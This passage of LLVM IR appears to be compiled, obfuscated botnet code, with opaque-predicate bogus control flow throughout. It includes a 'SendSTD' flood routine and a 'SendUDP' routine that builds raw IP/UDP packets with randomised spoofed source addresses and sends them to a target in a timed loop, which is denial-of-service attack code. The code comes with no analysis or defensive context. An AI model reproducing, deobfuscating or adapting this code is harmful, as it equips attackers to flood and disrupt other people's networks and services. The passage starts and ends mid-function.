  %gen165 = add i32 %_164, 7
  %_166 = sub i32 0, %1644
  %gen167 = add i32 %_166, 7
  %_168 = sub i32 %1644, 7
  %gen169 = mul i32 %_168, 7
  %1645 = add i32 %1644, 7
  %1646 = zext i32 %1645 to i64
  %1647 = call i64 @time(i64* null) #5
  %1648 = icmp slt i64 %1646, %1647
  br label %originalBB158

originalBB173alteredBB:                           ; preds = %originalBB173, %1132
  %1649 = load i32, i32* %6, align 4
  %1650 = sext i32 %1649 to i64
  %1651 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %43, i64 %1650
  call void @reset_telstate(%struct.telstate_t* %1651)
  br label %originalBB173

originalBB177alteredBB:                           ; preds = %originalBB177, %1178
  %1652 = call i64 @time(i64* null) #5
  %1653 = trunc i64 %1652 to i32
  %1654 = load i32, i32* %6, align 4
  %1655 = sext i32 %1654 to i64
  %1656 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %43, i64 %1655
  %1657 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1656, i32 0, i32 7
  store i32 %1653, i32* %1657, align 16
  %1658 = load i32, i32* %6, align 4
  %1659 = sext i32 %1658 to i64
  %1660 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %43, i64 %1659
  %1661 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1660, i32 0, i32 0
  %1662 = load i32, i32* %1661, align 16
  %1663 = call i64 @send(i32 %1662, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.507, i32 0, i32 0), i64 4, i32 16384)
  %1664 = icmp slt i64 %1663, 0
  br label %originalBB177

originalBB181alteredBB:                           ; preds = %originalBB181, %1208
  br label %originalBB181

originalBB185alteredBB:                           ; preds = %originalBB185, %1324
  br label %originalBB185
}

; Function Attrs: noinline nounwind uwtable
define void @SendSTD(i8*, i32, i32) #0 {
  %4 = load i32, i32* @x.75
  %5 = load i32, i32* @y.76
  %6 = sub i32 %4, 1
  %7 = mul i32 %4, %6
  %8 = urem i32 %7, 2
  %9 = icmp eq i32 %8, 0
  %10 = icmp slt i32 %5, 10
  %11 = or i1 %9, %10
  br i1 %11, label %originalBB, label %originalBBalteredBB

originalBB:                                       ; preds = %originalBBalteredBB, %3
  %12 = alloca i8*, align 8
  %13 = alloca i32, align 4
  %14 = alloca i32, align 4
  %15 = alloca i32, align 4
  %16 = alloca i64, align 8
  %17 = alloca %struct.sockaddr_in, align 4
  %18 = alloca %struct.hostent*, align 8
  %19 = alloca i32, align 4
  %20 = alloca [24 x i8*], align 16
  %21 = alloca i8*, align 8
  store i8* %0, i8** %12, align 8
  store i32 %1, i32* %13, align 4
  store i32 %2, i32* %14, align 4
  %22 = call i32 @socket(i32 2, i32 2, i32 0) #5
  store i32 %22, i32* %15, align 4
  %23 = call i64 @time(i64* null) #5
  store i64 %23, i64* %16, align 8
  %24 = load i8*, i8** %12, align 8
  %25 = call %struct.hostent* @gethostbyname(i8* %24)
  store %struct.hostent* %25, %struct.hostent** %18, align 8
  %26 = bitcast %struct.sockaddr_in* %17 to i8*
  call void @llvm.memset.p0i8.i64(i8* %26, i8 0, i64 16, i32 4, i1 false)
  %27 = load %struct.hostent*, %struct.hostent** %18, align 8
  %28 = getelementptr inbounds %struct.hostent, %struct.hostent* %27, i32 0, i32 4
  %29 = load i8**, i8*** %28, align 8
  %30 = getelementptr inbounds i8*, i8** %29, i64 0
  %31 = load i8*, i8** %30, align 8
  %32 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %17, i32 0, i32 2
  %33 = bitcast %struct.in_addr* %32 to i8*
  %34 = load %struct.hostent*, %struct.hostent** %18, align 8
  %35 = getelementptr inbounds %struct.hostent, %struct.hostent* %34, i32 0, i32 3
  %36 = load i32, i32* %35, align 4
  %37 = sext i32 %36 to i64
  call void @bcopy(i8* %31, i8* %33, i64 %37) #5
  %38 = load %struct.hostent*, %struct.hostent** %18, align 8
  %39 = getelementptr inbounds %struct.hostent, %struct.hostent* %38, i32 0, i32 2
  %40 = load i32, i32* %39, align 8
  %41 = trunc i32 %40 to i16
  %42 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %17, i32 0, i32 0
  store i16 %41, i16* %42, align 4
  %43 = load i32, i32* %13, align 4
  %44 = trunc i32 %43 to i16
  %45 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %17, i32 0, i32 1
  store i16 %44, i16* %45, align 2
  store i32 0, i32* %19, align 4
  %46 = load i32, i32* @x.75
  %47 = load i32, i32* @y.76
  %48 = sub i32 %46, 1
  %49 = mul i32 %46, %48
  %50 = urem i32 %49, 2
  %51 = icmp eq i32 %50, 0
  %52 = icmp slt i32 %47, 10
  %53 = or i1 %51, %52
  br i1 %53, label %originalBBpart2, label %originalBBalteredBB

originalBBpart2:                                  ; preds = %originalBB
  br label %54

; <label>:54:                                     ; preds = %80, %originalBBpart2
  %55 = bitcast [24 x i8*]* %20 to i8*
  call void @llvm.memcpy.p0i8.p0i8.i64(i8* %55, i8* bitcast ([24 x i8*]* @SendSTD.randstrings to i8*), i64 192, i32 16, i1 false)
  %56 = call i32 @rand() #5
  %57 = sext i32 %56 to i64
  %58 = urem i64 %57, 24
  %59 = getelementptr inbounds [24 x i8*], [24 x i8*]* %20, i64 0, i64 %58
  %60 = load i8*, i8** %59, align 8
  store i8* %60, i8** %21, align 8
  %61 = load i32, i32* %19, align 4
  %62 = icmp uge i32 %61, 50
  br i1 %62, label %63, label %80

; <label>:63:                                     ; preds = %54
  %64 = load i32, i32* %15, align 4
  %65 = load i8*, i8** %21, align 8
  %66 = call i64 @send(i32 %64, i8* %65, i64 69, i32 0)
  %67 = load i32, i32* %15, align 4
  %68 = bitcast %struct.sockaddr_in* %17 to %struct.sockaddr*
  %69 = call i32 @connect(i32 %67, %struct.sockaddr* %68, i32 16)
  %70 = call i64 @time(i64* null) #5
  %71 = load i64, i64* %16, align 8
  %72 = load i32, i32* %14, align 4
  %73 = sext i32 %72 to i64
  %74 = add nsw i64 %71, %73
  %75 = icmp sge i64 %70, %74
  br i1 %75, label %76, label %79

; <label>:76:                                     ; preds = %63
  %77 = load i32, i32* %15, align 4
  %78 = call i32 @close(i32 %77)
  call void @_exit(i32 0) #11
  unreachable

; <label>:79:                                     ; preds = %63
  store i32 0, i32* %19, align 4
  br label %80

; <label>:80:                                     ; preds = %79, %54
  %81 = load i32, i32* %19, align 4
  %82 = add i32 %81, 1
  store i32 %82, i32* %19, align 4
  br label %54
                                                  ; No predecessors!
  %84 = load i32, i32* @x.75
  %85 = load i32, i32* @y.76
  %86 = sub i32 %84, 1
  %87 = mul i32 %84, %86
  %88 = urem i32 %87, 2
  %89 = icmp eq i32 %88, 0
  %90 = icmp slt i32 %85, 10
  %91 = or i1 %89, %90
  br i1 %91, label %originalBB1, label %originalBB1alteredBB

originalBB1:                                      ; preds = %originalBB1alteredBB, %83
  %92 = load i32, i32* @x.75
  %93 = load i32, i32* @y.76
  %94 = sub i32 %92, 1
  %95 = mul i32 %92, %94
  %96 = urem i32 %95, 2
  %97 = icmp eq i32 %96, 0
  %98 = icmp slt i32 %93, 10
  %99 = or i1 %97, %98
  br i1 %99, label %originalBBpart24, label %originalBB1alteredBB

originalBBpart24:                                 ; preds = %originalBB1
  ret void

originalBBalteredBB:                              ; preds = %originalBB, %3
  %100 = alloca i8*, align 8
  %101 = alloca i32, align 4
  %102 = alloca i32, align 4
  %103 = alloca i32, align 4
  %104 = alloca i64, align 8
  %105 = alloca %struct.sockaddr_in, align 4
  %106 = alloca %struct.hostent*, align 8
  %107 = alloca i32, align 4
  %108 = alloca [24 x i8*], align 16
  %109 = alloca i8*, align 8
  store i8* %0, i8** %100, align 8
  store i32 %1, i32* %101, align 4
  store i32 %2, i32* %102, align 4
  %110 = call i32 @socket(i32 2, i32 2, i32 0) #5
  store i32 %110, i32* %103, align 4
  %111 = call i64 @time(i64* null) #5
  store i64 %111, i64* %104, align 8
  %112 = load i8*, i8** %100, align 8
  %113 = call %struct.hostent* @gethostbyname(i8* %112)
  store %struct.hostent* %113, %struct.hostent** %106, align 8
  %114 = bitcast %struct.sockaddr_in* %105 to i8*
  call void @llvm.memset.p0i8.i64(i8* %114, i8 0, i64 16, i32 4, i1 false)
  %115 = load %struct.hostent*, %struct.hostent** %106, align 8
  %116 = getelementptr inbounds %struct.hostent, %struct.hostent* %115, i32 0, i32 4
  %117 = load i8**, i8*** %116, align 8
  %118 = getelementptr inbounds i8*, i8** %117, i64 0
  %119 = load i8*, i8** %118, align 8
  %120 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %105, i32 0, i32 2
  %121 = bitcast %struct.in_addr* %120 to i8*
  %122 = load %struct.hostent*, %struct.hostent** %106, align 8
  %123 = getelementptr inbounds %struct.hostent, %struct.hostent* %122, i32 0, i32 3
  %124 = load i32, i32* %123, align 4
  %125 = sext i32 %124 to i64
  call void @bcopy(i8* %119, i8* %121, i64 %125) #5
  %126 = load %struct.hostent*, %struct.hostent** %106, align 8
  %127 = getelementptr inbounds %struct.hostent, %struct.hostent* %126, i32 0, i32 2
  %128 = load i32, i32* %127, align 8
  %129 = trunc i32 %128 to i16
  %130 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %105, i32 0, i32 0
  store i16 %129, i16* %130, align 4
  %131 = load i32, i32* %101, align 4
  %132 = trunc i32 %131 to i16
  %133 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %105, i32 0, i32 1
  store i16 %132, i16* %133, align 2
  store i32 0, i32* %107, align 4
  br label %originalBB

originalBB1alteredBB:                             ; preds = %originalBB1, %83
  br label %originalBB1
}

declare %struct.hostent* @gethostbyname(i8*) #1

; Function Attrs: nounwind
declare void @bcopy(i8*, i8*, i64) #3

; Function Attrs: noreturn
declare void @_exit(i32) #7

; Function Attrs: noinline nounwind uwtable
define void @SendUDP(i8*, i32, i32, i32, i32, i32) #0 {
  %7 = alloca i8*, align 8
  %8 = alloca i32, align 4
  %9 = alloca i32, align 4
  %10 = alloca i32, align 4
  %11 = alloca i32, align 4
  %12 = alloca i32, align 4
  %13 = alloca %struct.sockaddr_in, align 4
  %14 = alloca i32, align 4
  %15 = alloca i32, align 4
  %16 = alloca i32, align 4
  %17 = alloca i32, align 4
  %18 = alloca i32, align 4
  %19 = alloca i8*, align 8
  %20 = alloca %struct.iphdr*, align 8
  %21 = alloca %struct.udphdr*, align 8
  %22 = alloca i32, align 4
  %23 = alloca i32, align 4
  store i8* %0, i8** %7, align 8
  store i32 %1, i32* %8, align 4
  store i32 %2, i32* %9, align 4
  store i32 %3, i32* %10, align 4
  store i32 %4, i32* %11, align 4
  store i32 %5, i32* %12, align 4
  %24 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %13, i32 0, i32 0
  store i16 2, i16* %24, align 4
  %25 = load i32, i32* %8, align 4
  %26 = icmp eq i32 %25, 0
  br i1 %26, label %27, label %31

; <label>:27:                                     ; preds = %6
  %28 = call i32 @rand_cmwc()
  %29 = trunc i32 %28 to i16
  %30 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %13, i32 0, i32 1
  store i16 %29, i16* %30, align 2
  br label %36

; <label>:31:                                     ; preds = %6
  %32 = load i32, i32* %8, align 4
  %33 = trunc i32 %32 to i16
  %34 = call zeroext i16 @htons(i16 zeroext %33) #10
  %35 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %13, i32 0, i32 1
  store i16 %34, i16* %35, align 2
  br label %36

; <label>:36:                                     ; preds = %31, %27
  %37 = load i32, i32* @x.77
  %38 = load i32, i32* @y.78
  %39 = sub i32 %37, 1
  %40 = mul i32 %37, %39
  %41 = urem i32 %40, 2
  %42 = icmp eq i32 %41, 0
  %43 = icmp slt i32 %38, 10
  %44 = or i1 %42, %43
  br i1 %44, label %originalBB, label %originalBBalteredBB

originalBB:                                       ; preds = %originalBBalteredBB, %36
  %45 = load i8*, i8** %7, align 8
  %46 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %13, i32 0, i32 2
  %47 = call i32 @getHost(i8* %45, %struct.in_addr* %46)
  %48 = icmp ne i32 %47, 0
  %49 = load i32, i32* @x.77
  %50 = load i32, i32* @y.78
  %51 = sub i32 %49, 1
  %52 = mul i32 %49, %51
  %53 = urem i32 %52, 2
  %54 = icmp eq i32 %53, 0
  %55 = icmp slt i32 %50, 10
  %56 = or i1 %54, %55
  br i1 %56, label %originalBBpart2, label %originalBBalteredBB

originalBBpart2:                                  ; preds = %originalBB
  br i1 %48, label %57, label %58

; <label>:57:                                     ; preds = %originalBBpart2
  br label %334

; <label>:58:                                     ; preds = %originalBBpart2
  %59 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %13, i32 0, i32 3
  %60 = getelementptr inbounds [8 x i8], [8 x i8]* %59, i32 0, i32 0
  call void @llvm.memset.p0i8.i64(i8* %60, i8 0, i64 8, i32 4, i1 false)
  %61 = load i32, i32* %11, align 4
  store i32 %61, i32* %14, align 4
  %62 = call i32 @socket(i32 2, i32 3, i32 17) #5
  store i32 %62, i32* %15, align 4
  %63 = load i32, i32* %15, align 4
  %64 = icmp ne i32 %63, 0
  br i1 %64, label %82, label %65

; <label>:65:                                     ; preds = %58
  %66 = load i32, i32* @x.77
  %67 = load i32, i32* @y.78
  %68 = sub i32 %66, 1
  %69 = mul i32 %66, %68
  %70 = urem i32 %69, 2
  %71 = icmp eq i32 %70, 0
  %72 = icmp slt i32 %67, 10
  %73 = or i1 %71, %72
  br i1 %73, label %originalBB1, label %originalBB1alteredBB

originalBB1:                                      ; preds = %originalBB1alteredBB, %65
  %74 = load i32, i32* @x.77
  %75 = load i32, i32* @y.78
  %76 = sub i32 %74, 1
  %77 = mul i32 %74, %76
  %78 = urem i32 %77, 2
  %79 = icmp eq i32 %78, 0
  %80 = icmp slt i32 %75, 10
  %81 = or i1 %79, %80
  br i1 %81, label %originalBBpart24, label %originalBB1alteredBB

originalBBpart24:                                 ; preds = %originalBB1
  br label %334

; <label>:82:                                     ; preds = %58
  store i32 1, i32* %16, align 4
  %83 = load i32, i32* %15, align 4
  %84 = bitcast i32* %16 to i8*
  %85 = call i32 @setsockopt(i32 %83, i32 0, i32 3, i8* %84, i32 4) #5
  %86 = icmp slt i32 %85, 0
  br i1 %86, label %87, label %104

; <label>:87:                                     ; preds = %82
  %88 = load i32, i32* @x.77
  %89 = load i32, i32* @y.78
  %90 = sub i32 %88, 1
  %91 = mul i32 %88, %90
  %92 = urem i32 %91, 2
  %93 = icmp eq i32 %92, 0
  %94 = icmp slt i32 %89, 10
  %95 = or i1 %93, %94
  br i1 %95, label %originalBB6, label %originalBB6alteredBB

originalBB6:                                      ; preds = %originalBB6alteredBB, %87
  %96 = load i32, i32* @x.77
  %97 = load i32, i32* @y.78
  %98 = sub i32 %96, 1
  %99 = mul i32 %96, %98
  %100 = urem i32 %99, 2
  %101 = icmp eq i32 %100, 0
  %102 = icmp slt i32 %97, 10
  %103 = or i1 %101, %102
  br i1 %103, label %originalBBpart28, label %originalBB6alteredBB

originalBBpart28:                                 ; preds = %originalBB6
  br label %334

; <label>:104:                                    ; preds = %82
  store i32 50, i32* %17, align 4
  br label %105

; <label>:105:                                    ; preds = %109, %104
  %106 = load i32, i32* %17, align 4
  %107 = add nsw i32 %106, -1
  store i32 %107, i32* %17, align 4
  %108 = icmp ne i32 %106, 0
  br i1 %108, label %109, label %116

; <label>:109:                                    ; preds = %105
  %110 = call i64 @time(i64* null) #5
  %111 = call i32 @rand_cmwc()
  %112 = zext i32 %111 to i64
  %113 = xor i64 %110, %112
  %114 = trunc i64 %113 to i32
  call void @srand(i32 %114) #5
  %115 = call i32 @rand() #5
  call void @init_rand(i32 %115)
  br label %105

; <label>:116:                                    ; preds = %105
  %117 = load i32, i32* %12, align 4
  %118 = sub nsw i32 32, %117
  %119 = shl i32 1, %118
  %120 = sub nsw i32 %119, 1
  %121 = xor i32 %120, -1
  store i32 %121, i32* %18, align 4
  %122 = load i32, i32* %10, align 4
  %123 = sext i32 %122 to i64
  %124 = add i64 28, %123
  %125 = call i8* @llvm.stacksave()
  store i8* %125, i8** %19, align 8
  %126 = alloca i8, i64 %124, align 16
  %127 = bitcast i8* %126 to %struct.iphdr*
  store %struct.iphdr* %127, %struct.iphdr** %20, align 8
  %128 = load %struct.iphdr*, %struct.iphdr** %20, align 8
  %129 = bitcast %struct.iphdr* %128 to i8*
  %130 = getelementptr i8, i8* %129, i64 20
  %131 = bitcast i8* %130 to %struct.udphdr*
  store %struct.udphdr* %131, %struct.udphdr** %21, align 8
  %132 = load %struct.iphdr*, %struct.iphdr** %20, align 8
  %133 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %13, i32 0, i32 2
  %134 = getelementptr inbounds %struct.in_addr, %struct.in_addr* %133, i32 0, i32 0
  %135 = load i32, i32* %134, align 4
  %136 = load i32, i32* %18, align 4
  %137 = call i32 @getRandomIP(i32 %136)
  %138 = call i32 @htonl(i32 %137) #10
  %139 = load i32, i32* %10, align 4
  %140 = sext i32 %139 to i64
  %141 = add i64 8, %140
  %142 = trunc i64 %141 to i32
  call void @makeIPPacket(%struct.iphdr* %132, i32 %135, i32 %138, i8 zeroext 17, i32 %142)
  %143 = load i32, i32* %10, align 4
  %144 = sext i32 %143 to i64
  %145 = add i64 8, %144
  %146 = trunc i64 %145 to i16
  %147 = call zeroext i16 @htons(i16 zeroext %146) #10
  %148 = load %struct.udphdr*, %struct.udphdr** %21, align 8
  %149 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %148, i32 0, i32 0
  %150 = bitcast %union.anon.1* %149 to %struct.anon.2*
  %151 = getelementptr inbounds %struct.anon.2, %struct.anon.2* %150, i32 0, i32 2
  store i16 %147, i16* %151, align 2
  %152 = call i32 @rand_cmwc()
  %153 = trunc i32 %152 to i16
  %154 = load %struct.udphdr*, %struct.udphdr** %21, align 8
  %155 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %154, i32 0, i32 0
  %156 = bitcast %union.anon.1* %155 to %struct.anon.2*
  %157 = getelementptr inbounds %struct.anon.2, %struct.anon.2* %156, i32 0, i32 0
  store i16 %153, i16* %157, align 2
  %158 = load i32, i32* %8, align 4
  %159 = icmp eq i32 %158, 0
  br i1 %159, label %160, label %162

; <label>:160:                                    ; preds = %116
  %161 = call i32 @rand_cmwc()
  br label %167

; <label>:162:                                    ; preds = %116
  %163 = load i32, i32* %8, align 4
  %164 = trunc i32 %163 to i16
  %165 = call zeroext i16 @htons(i16 zeroext %164) #10
  %166 = zext i16 %165 to i32
  br label %167

; <label>:167:                                    ; preds = %162, %160
  %168 = phi i32 [ %161, %160 ], [ %166, %162 ]
  %169 = load i32, i32* @x.77
  %170 = load i32, i32* @y.78
  %171 = sub i32 %169, 1
  %172 = mul i32 %169, %171
  %173 = urem i32 %172, 2
  %174 = icmp eq i32 %173, 0
  %175 = icmp slt i32 %170, 10
  %176 = or i1 %174, %175
  br i1 %176, label %originalBB10, label %originalBB10alteredBB

originalBB10:                                     ; preds = %originalBB10alteredBB, %167
  %177 = trunc i32 %168 to i16
  %178 = load %struct.udphdr*, %struct.udphdr** %21, align 8
  %179 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %178, i32 0, i32 0
  %180 = bitcast %union.anon.1* %179 to %struct.anon.2*
  %181 = getelementptr inbounds %struct.anon.2, %struct.anon.2* %180, i32 0, i32 1
  store i16 %177, i16* %181, align 2
  %182 = load %struct.udphdr*, %struct.udphdr** %21, align 8
  %183 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %182, i32 0, i32 0
  %184 = bitcast %union.anon.1* %183 to %struct.anon.2*
  %185 = getelementptr inbounds %struct.anon.2, %struct.anon.2* %184, i32 0, i32 3
  store i16 0, i16* %185, align 2
  %186 = load %struct.udphdr*, %struct.udphdr** %21, align 8
  %187 = bitcast %struct.udphdr* %186 to i8*
  %188 = getelementptr inbounds i8, i8* %187, i64 8
  %189 = load i32, i32* %10, align 4
  call void @makeRandomStr(i8* %188, i32 %189)
  %190 = bitcast i8* %126 to i16*
  %191 = load %struct.iphdr*, %struct.iphdr** %20, align 8
  %192 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %191, i32 0, i32 2
  %193 = load i16, i16* %192, align 2
  %194 = zext i16 %193 to i32
  %195 = call zeroext i16 @csum(i16* %190, i32 %194)
  %196 = load %struct.iphdr*, %struct.iphdr** %20, align 8
  %197 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %196, i32 0, i32 7
  store i16 %195, i16* %197, align 2
  %198 = call i64 @time(i64* null) #5
  %199 = load i32, i32* %9, align 4
  %200 = sext i32 %199 to i64
  %201 = add nsw i64 %198, %200
  %202 = trunc i64 %201 to i32
  store i32 %202, i32* %22, align 4
  store i32 0, i32* %23, align 4
  %203 = load i32, i32* @x.77
  %204 = load i32, i32* @y.78
  %205 = sub i32 %203, 1
  %206 = mul i32 %203, %205
  %207 = urem i32 %206, 2
  %208 = icmp eq i32 %207, 0
  %209 = icmp slt i32 %204, 10
  %210 = or i1 %208, %209
  br i1 %210, label %originalBBpart222, label %originalBB10alteredBB

originalBBpart222:                                ; preds = %originalBB10
  br label %211

; <label>:211:                                    ; preds = %329, %328, %originalBBpart222
  %212 = load i32, i32* @x.77
  %213 = load i32, i32* @y.78
  %214 = sub i32 %212, 1
  %215 = mul i32 %212, %214
  %216 = urem i32 %215, 2
  %217 = icmp eq i32 %216, 0
  %218 = icmp slt i32 %213, 10
  %219 = or i1 %217, %218
  br i1 %219, label %originalBB24, label %originalBB24alteredBB

originalBB24:                                     ; preds = %originalBB24alteredBB, %211
  %220 = load i32, i32* @x.77
  %221 = load i32, i32* @y.78
  %222 = sub i32 %220, 1
  %223 = mul i32 %220, %222
  %224 = urem i32 %223, 2
  %225 = icmp eq i32 %224, 0
  %226 = icmp slt i32 %221, 10
  %227 = or i1 %225, %226
  br i1 %227, label %originalBBpart227, label %originalBB24alteredBB

originalBBpart227:                                ; preds = %originalBB24
  br label %228

; <label>:228:                                    ; preds = %originalBBpart227
  %229 = load i32, i32* @x.77
  %230 = load i32, i32* @y.78
  %231 = sub i32 %229, 1
  %232 = mul i32 %229, %231
  %233 = urem i32 %232, 2
  %234 = icmp eq i32 %233, 0
  %235 = icmp slt i32 %230, 10
  %236 = or i1 %234, %235
  br i1 %236, label %originalBB29, label %originalBB29alteredBB

originalBB29:                                     ; preds = %originalBB29alteredBB, %228
  %237 = load i32, i32* %15, align 4
  %238 = bitcast %struct.sockaddr_in* %13 to %struct.sockaddr*
  %239 = call i64 @sendto(i32 %237, i8* %126, i64 %124, i32 0, %struct.sockaddr* %238, i32 16)
  %240 = call i32 @rand_cmwc()
  %241 = trunc i32 %240 to i16
  %242 = load %struct.udphdr*, %struct.udphdr** %21, align 8
  %243 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %242, i32 0, i32 0
  %244 = bitcast %union.anon.1* %243 to %struct.anon.2*
  %245 = getelementptr inbounds %struct.anon.2, %struct.anon.2* %244, i32 0, i32 0
  store i16 %241, i16* %245, align 2
  %246 = load i32, i32* %8, align 4
  %247 = icmp eq i32 %246, 0
  %248 = load i32, i32* @x.77
  %249 = load i32, i32* @y.78
  %250 = sub i32 %248, 1
  %251 = mul i32 %248, %250
  %252 = urem i32 %251, 2
  %253 = icmp eq i32 %252, 0
  %254 = icmp slt i32 %249, 10
  %255 = or i1 %253, %254
  br i1 %255, label %originalBBpart231, label %originalBB29alteredBB

originalBBpart231:                                ; preds = %originalBB29
  br i1 %247, label %256, label %274

; <label>:256:                                    ; preds = %originalBBpart231
  %257 = load i32, i32* @x.77
  %258 = load i32, i32* @y.78
  %259 = sub i32 %257, 1
  %260 = mul i32 %257, %259
  %261 = urem i32 %260, 2
  %262 = icmp eq i32 %261, 0
  %263 = icmp slt i32 %258, 10
  %264 = or i1 %262, %263
  br i1 %264, label %originalBB33, label %originalBB33alteredBB

originalBB33:                                     ; preds = %originalBB33alteredBB, %256
  %265 = call i32 @rand_cmwc()
  %266 = load i32, i32* @x.77
  %267 = load i32, i32* @y.78
  %268 = sub i32 %266, 1
  %269 = mul i32 %266, %268
  %270 = urem i32 %269, 2
  %271 = icmp eq i32 %270, 0
  %272 = icmp slt i32 %267, 10
  %273 = or i1 %271, %272
  br i1 %273, label %originalBBpart235, label %originalBB33alteredBB

originalBBpart235:                                ; preds = %originalBB33
  br label %279

; <label>:274:                                    ; preds = %originalBBpart231
  %275 = load i32, i32* %8, align 4
  %276 = trunc i32 %275 to i16
  %277 = call zeroext i16 @htons(i16 zeroext %276) #10
  %278 = zext i16 %277 to i32
  br label %279

; <label>:279:                                    ; preds = %274, %originalBBpart235
  %280 = phi i32 [ %265, %originalBBpart235 ], [ %278, %274 ]
  %281 = load i32, i32* @x.77
  %282 = load i32, i32* @y.78
  %283 = sub i32 %281, 1
  %284 = mul i32 %281, %283
  %285 = urem i32 %284, 2
  %286 = icmp eq i32 %285, 0
  %287 = icmp slt i32 %282, 10
  %288 = or i1 %286, %287
  br i1 %288, label %originalBB37, label %originalBB37alteredBB

originalBB37:                                     ; preds = %originalBB37alteredBB, %279
  %289 = trunc i32 %280 to i16
  %290 = load %struct.udphdr*, %struct.udphdr** %21, align 8
  %291 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %290, i32 0, i32 0
  %292 = bitcast %union.anon.1* %291 to %struct.anon.2*
  %293 = getelementptr inbounds %struct.anon.2, %struct.anon.2* %292, i32 0, i32 1
  store i16 %289, i16* %293, align 2
  %294 = call i32 @rand_cmwc()
  %295 = trunc i32 %294 to i16
  %296 = load %struct.iphdr*, %struct.iphdr** %20, align 8
  %297 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %296, i32 0, i32 3
  store i16 %295, i16* %297, align 4
  %298 = load i32, i32* %18, align 4
  %299 = call i32 @getRandomIP(i32 %298)
  %300 = call i32 @htonl(i32 %299) #10
  %301 = load %struct.iphdr*, %struct.iphdr** %20, align 8
  %302 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %301, i32 0, i32 8
  store i32 %300, i32* %302, align 4
  %303 = bitcast i8* %126 to i16*
  %304 = load %struct.iphdr*, %struct.iphdr** %20, align 8
  %305 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %304, i32 0, i32 2
  %306 = load i16, i16* %305, align 2
  %307 = zext i16 %306 to i32
  %308 = call zeroext i16 @csum(i16* %303, i32 %307)
  %309 = load %struct.iphdr*, %struct.iphdr** %20, align 8
  %310 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %309, i32 0, i32 7
  store i16 %308, i16* %310, align 2
  %311 = load i32, i32* %23, align 4
  %312 = load i32, i32* %14, align 4
  %313 = icmp eq i32 %311, %312
  %314 = load i32, i32* @x.77
  %315 = load i32, i32* @y.78
  %316 = sub i32 %314, 1
  %317 = mul i32 %314, %316
  %318 = urem i32 %317, 2
  %319 = icmp eq i32 %318, 0
  %320 = icmp slt i32 %315, 10
  %321 = or i1 %319, %320
  br i1 %321, label %originalBBpart239, label %originalBB37alteredBB

originalBBpart239:                                ; preds = %originalBB37
  br i1 %313, label %322, label %329

; <label>:322:                                    ; preds = %originalBBpart239
  %323 = call i64 @time(i64* null) #5
  %324 = load i32, i32* %22, align 4
  %325 = sext i32 %324 to i64
  %326 = icmp sgt i64 %323, %325
  br i1 %326, label %327, label %328

; <label>:327:                                    ; preds = %322
  br label %332

; <label>:328:                                    ; preds = %322
  store i32 0, i32* %23, align 4
  br label %211

; <label>:329:                                    ; preds = %originalBBpart239
  %330 = load i32, i32* %23, align 4
  %331 = add i32 %330, 1
  store i32 %331, i32* %23, align 4
  br label %211

; <label>:332:                                    ; preds = %327
  %333 = load i8*, i8** %19, align 8
  call void @llvm.stackrestore(i8* %333)
  br label %334

; <label>:334:                                    ; preds = %332, %originalBBpart28, %originalBBpart24, %57
  ret void

originalBBalteredBB:                              ; preds = %originalBB, %36
  %335 = load i8*, i8** %7, align 8
  %336 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %13, i32 0, i32 2
  %337 = call i32 @getHost(i8* %335, %struct.in_addr* %336)
  %338 = icmp ne i32 %337, 0
  br label %originalBB

originalBB1alteredBB:                             ; preds = %originalBB1, %65
  br label %originalBB1

originalBB6alteredBB:                             ; preds = %originalBB6, %87
  br label %originalBB6

originalBB10alteredBB:                            ; preds = %originalBB10, %167
  %339 = trunc i32 %168 to i16
  %340 = load %struct.udphdr*, %struct.udphdr** %21, align 8
  %341 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %340, i32 0, i32 0
  %342 = bitcast %union.anon.1* %341 to %struct.anon.2*
  %343 = getelementptr inbounds %struct.anon.2, %struct.anon.2* %342, i32 0, i32 1
  store i16 %339, i16* %343, align 2
  %344 = load %struct.udphdr*, %struct.udphdr** %21, align 8
  %345 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %344, i32 0, i32 0
  %346 = bitcast %union.anon.1* %345 to %struct.anon.2*
  %347 = getelementptr inbounds %struct.anon.2, %struct.anon.2* %346, i32 0, i32 3
  store i16 0, i16* %347, align 2
  %348 = load %struct.udphdr*, %struct.udphdr** %21, align 8
  %349 = bitcast %struct.udphdr* %348 to i8*
  %350 = getelementptr inbounds i8, i8* %349, i64 8
  %351 = load i32, i32* %10, align 4
  call void @makeRandomStr(i8* %350, i32 %351)
  %352 = bitcast i8* %126 to i16*
  %353 = load %struct.iphdr*, %struct.iphdr** %20, align 8
  %354 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %353, i32 0, i32 2
  %355 = load i16, i16* %354, align 2
  %356 = zext i16 %355 to i32
